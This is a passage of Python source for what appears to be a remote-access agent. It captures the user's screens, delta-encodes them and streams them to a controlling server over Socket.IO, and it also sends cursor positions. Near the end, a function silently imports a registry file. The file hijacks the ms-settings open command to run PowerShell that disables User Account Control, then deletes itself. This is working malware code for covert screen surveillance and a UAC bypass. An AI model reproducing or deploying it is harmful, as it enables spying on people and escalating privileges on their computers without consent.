                    elif DISPLAY_MODE == 'pip' and len(monitors) > 1 and sct:
                        base_m = monitors[monitor_index]
                        pip_idx = PIP_MONITOR_INDEX if 1 <= PIP_MONITOR_INDEX < len(monitors) else 1
                        pip_m = monitors[pip_idx]
                        base_img = np.array(sct.grab(base_m))
                        pip_img = np.array(sct.grab(pip_m))
                        if base_img.shape[2] == 4:
                            base_img = cv2.cvtColor(base_img, cv2.COLOR_BGRA2BGR)
                        if pip_img.shape[2] == 4:
                            pip_img = cv2.cvtColor(pip_img, cv2.COLOR_BGRA2BGR)
                        pip_h = max(1, base_img.shape[0] // 4)
                        pip_w = max(1, base_img.shape[1] // 4)
                        pip_resized = cv2.resize(pip_img, (pip_w, pip_h), interpolation=cv2.INTER_AREA)
                        x_off = max(0, base_img.shape[1] - pip_w - 10)
                        y_off = max(0, base_img.shape[0] - pip_h - 10)
                        img = base_img.copy()
                        try:
                            img[y_off:y_off+pip_h, x_off:x_off+pip_w] = pip_resized
                        except Exception:
                            img = base_img
                    else:
                        region = (left, top, right, bottom)
                        frame = hpc.capture_frame(region=region) if hpc else None
                        if frame is not None:
                            img = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                        elif sct and monitor is not None:
                            sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
                            img = np.array(sct_img)
                        else:
                            img = np.zeros((height, width, 3), dtype=np.uint8)
                    if img.shape[1] != width or img.shape[0] != height:
                        img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                    if img.shape[2] == 4:
                        img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    queue_size = capture_queue.qsize()
                    if queue_size < CAPTURE_QUEUE_SIZE:
                        try:
                            capture_queue.put_nowait(img)
                        except queue.Full:
                            pass
                    else:
                        pass
                    elapsed = time.time() - start
                    sleep_time = max(0, frame_time - elapsed)
                    if sleep_time > 0:
                        time.sleep(sleep_time)
                except KeyboardInterrupt:
                    log_message("Screen capture worker interrupted")
                    break
        except KeyboardInterrupt:
            log_message("Screen capture worker interrupted")
    except KeyboardInterrupt:
        log_message("Screen capture worker interrupted")
    log_message("Screen capture stopped")

def screen_encode_worker(agent_id):
    global STREAMING_ENABLED, capture_queue, encode_queue
    if not CV2_AVAILABLE:
        log_message("OpenCV not available for screen encoding", "error")
        return
    
    try:
        prev_gray = None
        last_keyframe_ts = 0.0
        tile_size = max(16, int(STREAM_TILE_SIZE))
        diff_thresh = max(1, int(DELTA_DIFF_THRESHOLD))
        frame_seq = 0
        tile_jpeg_q = 50
        ema_tiles = 0.0
        while STREAMING_ENABLED:
            try:
                try:
                    img = capture_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                # If delta streaming disabled, send full-frame JPEG
                if not DELTA_STREAM_ENABLED:
                    queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
                    jpeg_quality = 15 if queue_fullness <= 0.5 else 10
                    is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
                    if is_success:
                        try:
                            if encode_queue.full():
                                encode_queue.get_nowait()
                            frame_seq += 1
                            encode_queue.put_nowait({'type': 'frame', 'frame_id': frame_seq, 'bytes': encoded.tobytes(), 'width': img.shape[1], 'height': img.shape[0]})
                        except queue.Full:
                            pass
                    continue

                # Delta (tile-based) encoding
                gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
                h, w = gray.shape[:2]
                now_ts = time.time()
                # Periodic keyframe to establish baseline
                if prev_gray is None or (now_ts - last_keyframe_ts) >= KEYFRAME_INTERVAL_SECONDS:
                    queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
                    jpeg_quality = 20 if queue_fullness <= 0.5 else 12
                    is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, jpeg_quality])
                    if is_success:
                        try:
                            if encode_queue.full():
                                encode_queue.get_nowait()
                            frame_seq += 1
                            encode_queue.put_nowait({'type': 'keyframe', 'frame_id': frame_seq, 'bytes': encoded.tobytes(), 'width': w, 'height': h})
                        except queue.Full:
                            pass
                        last_keyframe_ts = now_ts
                    prev_gray = gray
                    continue

                # Compute changed tiles
                dy = tile_size
                dx = tile_size
                # Absolute difference from previous gray
                diff = cv2.absdiff(gray, prev_gray)
                # For each tile, compute mean difference
                frame_seq += 1
                tiles_encoded = 0
                grid_tiles = ((h + dy - 1) // dy) * ((w + dx - 1) // dx)
                for y0 in range(0, h, dy):
                    y1 = min(y0 + dy, h)
                    for x0 in range(0, w, dx):
                        x1 = min(x0 + dx, w)
                        tile_diff = diff[y0:y1, x0:x1]
                        mean_diff = float(np.mean(tile_diff))
                        if mean_diff >= diff_thresh:
                            tile_bgr = img[y0:y1, x0:x1]
                            is_ok, enc = cv2.imencode('.jpg', tile_bgr, [cv2.IMWRITE_JPEG_QUALITY, tile_jpeg_q])
                            if is_ok:
                                try:
                                    if encode_queue.full():
                                        encode_queue.get_nowait()
                                    encode_queue.put_nowait({'type': 'tile', 'frame_id': frame_seq, 'x': x0, 'y': y0, 'w': (x1 - x0), 'h': (y1 - y0), 'bytes': enc.tobytes()})
                                    tiles_encoded += 1
                                except queue.Full:
                                    pass
                queue_fullness = encode_queue.qsize() / ENCODE_QUEUE_SIZE
                ema_tiles = (0.8 * ema_tiles) + (0.2 * float(tiles_encoded))
                if queue_fullness > 0.7 or tiles_encoded > int(grid_tiles * 0.4):
                    diff_thresh = min(diff_thresh + 1, 32)
                    tile_jpeg_q = max(35, tile_jpeg_q - 5)
                    if tiles_encoded > int(grid_tiles * 0.6):
                        tile_size = min(128, max(16, tile_size * 2))
                        prev_gray = None
                        last_keyframe_ts = 0.0
                elif queue_fullness < 0.2 and tiles_encoded < max(4, int(grid_tiles * 0.05)):
                    diff_thresh = max(4, diff_thresh - 1)
                    tile_jpeg_q = min(60, tile_jpeg_q + 2)
                    if ema_tiles < 12 and tile_size > 32:
                        tile_size = max(32, tile_size // 2)
                DELTA_DIFF_THRESHOLD = diff_thresh
                STREAM_TILE_SIZE = tile_size
                try:
                    ADAPTIVE_STATS_SCREEN['ema_tiles'] = float(ema_tiles)
                    ADAPTIVE_STATS_SCREEN['tile_size'] = int(tile_size)
                    ADAPTIVE_STATS_SCREEN['diff_threshold'] = int(diff_thresh)
                except Exception:
                    pass
                prev_gray = gray
            except KeyboardInterrupt:
                log_message("Screen encode worker interrupted")
                break
    except KeyboardInterrupt:
        log_message("Screen encode worker interrupted")
    
    log_message("Screen encoding stopped")

def screen_send_worker(agent_id):
    global STREAMING_ENABLED, encode_queue, sio
    
    # Track last log time to avoid spam
    last_disconnect_log_time = 0.0
    
    # FPS and bandwidth tracking
    frame_count = 0
    bytes_sent = 0
    start_time = time.time()
    last_stats_time = start_time
    
    max_bytes_per_second = 5 * 1024 * 1024
    bytes_this_second = 0
    second_start = time.time()
    
    try:
        while STREAMING_ENABLED:
            try:
                try:
                    item = encode_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                
                # Check if socket is connected before sending
                if not sio.connected:
                    # Throttle disconnect log messages
                    now = time.time()
                    if now >= last_disconnect_log_time + 5.0:
                        log_message("Socket.IO disconnected, deferring screen frames", "warning")
                        last_disconnect_log_time = now
                    time.sleep(0.5)
                    continue
                
                try:
                    size = 0
                    now = time.time()
                    if isinstance(item, dict) and 'type' in item:
                        if item['type'] == 'frame':
                            raw = item['bytes']
                            b64 = base64.b64encode(raw).decode('utf-8')
                            data_url = f'data:image/jpeg;base64,{b64}'
                            rate_limit_before_send(len(raw))
                            safe_emit('screen_frame', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'frame': data_url})
                            size = len(raw)
                        elif item['type'] == 'keyframe':
                            raw = item['bytes']
                            b64 = base64.b64encode(raw).decode('utf-8')
                            data_url = f'data:image/jpeg;base64,{b64}'
                            rate_limit_before_send(len(raw))
                            safe_emit('screen_keyframe', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'width': item.get('width'), 'height': item.get('height'), 'frame': data_url})
                            size = len(raw)
                        elif item['type'] == 'tile':
                            raw = item['bytes']
                            b64 = base64.b64encode(raw).decode('utf-8')
                            data_url = f'data:image/jpeg;base64,{b64}'
                            rate_limit_before_send(len(raw))
                            safe_emit('screen_tile', {'agent_id': agent_id, 'frame_id': item.get('frame_id'), 'x': item.get('x'), 'y': item.get('y'), 'w': item.get('w'), 'h': item.get('h'), 'frame': data_url})
                            size = len(raw)
                    else:
                        raw = item if isinstance(item, (bytes, bytearray)) else bytes(item)
                        b64 = base64.b64encode(raw).decode('utf-8')
                        data_url = f'data:image/jpeg;base64,{b64}'
                        rate_limit_before_send(len(raw))
                        safe_emit('screen_frame', {'agent_id': agent_id, 'frame': data_url})
                        size = len(raw)
                    
                    if size > 0:
                        bytes_sent += size
                        bytes_this_second += size
                        frame_count += 1
                    
                    if now - second_start >= 1.0:
                        bytes_this_second = 0
                        second_start = now
                    elif bytes_this_second >= max_bytes_per_second:
                        sleep_time = 1.0 - (now - second_start)
                        if sleep_time > 0:
                            time.sleep(sleep_time)
                        bytes_this_second = 0
                        second_start = time.time()
                    
                    if now - last_stats_time >= 5.0:
                        elapsed = now - start_time
                        fps = frame_count / elapsed if elapsed > 0 else 0
                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
                        log_message(f"Screen stream: {fps:.1f} FPS, {mbps:.1f} MB/s, {frame_count} packets total")
                        last_stats_time = now
                    if now - last_stats_emit >= 2.0:
                        elapsed = now - start_time
                        fps = frame_count / elapsed if elapsed > 0 else 0
                        mbps = (bytes_sent / elapsed / 1024 / 1024) if elapsed > 0 else 0
                        try:
                            stats_payload = {
                                'agent_id': agent_id,
                                'stats': {
                                    'screen': {
                                        'fps': float(fps),
                                        'quality': str(SCREEN_JPEG_QUALITY),
                                        'bandwidth_mbps': float(mbps),
                                        'avg_frame_time': float(1000.0 / fps) if fps > 0 else 0.0,
                                    },
                                    'delta': {
                                        'tile_size': int(ADAPTIVE_STATS_SCREEN.get('tile_size', STREAM_TILE_SIZE)),
                                        'diff_threshold': int(ADAPTIVE_STATS_SCREEN.get('diff_threshold', DELTA_DIFF_THRESHOLD)),
                                        'ema_tiles': float(ADAPTIVE_STATS_SCREEN.get('ema_tiles', 0.0)),
                                    }
                                }
                            }
                            safe_emit('stream_stats_update', stats_payload)
                        except Exception:
                            pass
                        last_stats_emit = now
                    
                except Exception as e:
                    error_msg = str(e)
                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                        log_message(f"SocketIO send error: {e}", "error")
                    time.sleep(0.1)
            except KeyboardInterrupt:
                log_message("Screen send worker interrupted")
                break
    except KeyboardInterrupt:
        log_message("Screen send worker interrupted")
    
    log_message("Screen send stopped")

# [ OK ] NOW DEFINE stream_screen_h264_socketio AFTER worker functions exist
def stream_screen_h264_socketio(agent_id):
    """Modern H.264 screen streaming with SocketIO."""
    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
    import queue
    import threading
    
    # Don't check STREAMING_ENABLED here - it's already set by start_streaming()
    # Always start the worker threads when this function is called
    capture_queue = queue.Queue(maxsize=CAPTURE_QUEUE_SIZE)
    encode_queue = queue.Queue(maxsize=ENCODE_QUEUE_SIZE)
    STREAM_THREADS = [
        threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
        threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
        threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
    ]
    STREAM_THREADS.append(threading.Thread(target=cursor_emit_worker, args=(agent_id,), daemon=True))
    for t in STREAM_THREADS:
        t.start()
    log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")

# [ OK ] NOW DEFINE stream_screen_webrtc_or_socketio AFTER stream_screen_h264_socketio
def stream_screen_webrtc_or_socketio(agent_id):
    """Smart screen streaming that automatically chooses WebRTC or Socket.IO based on availability."""
    if AIORTC_AVAILABLE and WEBRTC_ENABLED:
        log_message("Using WebRTC for screen streaming (sub-second latency)")
        return start_webrtc_screen_streaming(agent_id)
    else:
        log_message("Using Socket.IO for screen streaming (fallback mode)")
        return stream_screen_h264_socketio(agent_id)

# Removed duplicate functions - these are already defined above
def cursor_emit_worker(agent_id):
    global STREAMING_ENABLED, sio
    try:
        while STREAMING_ENABLED:
            try:
                if not CURSOR_EMIT_ENABLED:
                    time.sleep(0.2)
                    continue
                import ctypes
                from ctypes import wintypes
                pt = wintypes.POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
                sw = int(ctypes.windll.user32.GetSystemMetrics(0))
                sh = int(ctypes.windll.user32.GetSystemMetrics(1))
                safe_emit('cursor_update', {
                    'agent_id': agent_id,
                    'x': int(pt.x),
                    'y': int(pt.y),
                    'screen_w': sw,
                    'screen_h': sh,
                    'visible': True
                })
            except Exception:
                pass
            time.sleep(0.016)
    except KeyboardInterrupt:
        pass

# Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.

# Note: os, subprocess, and time already imported above

def write_and_import_uac_bypass_reg():
    reg_content = r'''
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
@="powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'EnableLUA' -Value 0 -Force; Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Force\""
"DelegateExecute"=""
'''
    
    # Write registry file
    reg_file_path = os.path.join(tempfile.gettempdir(), "uac_bypass.reg")
    with open(reg_file_path, 'w') as f:
        f.write(reg_content)
    
    # Import registry file
    try:
        subprocess.run(['regedit.exe', '/s', reg_file_path], 
                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        log_message("UAC bypass registry imported successfully")
        
        # Clean up
        try:
            os.remove(reg_file_path)
        except Exception as e:
            log_message(f"Could not remove temporary registry file: {e}", "warning")
            
        return True
        
    except Exception as e:
        log_message(f"Failed to import UAC bypass registry: {e}")
        return False

# End of file
if __name__ == "__main__":
    try:
        import multiprocessing
        multiprocessing.freeze_support()
    except Exception:
        pass
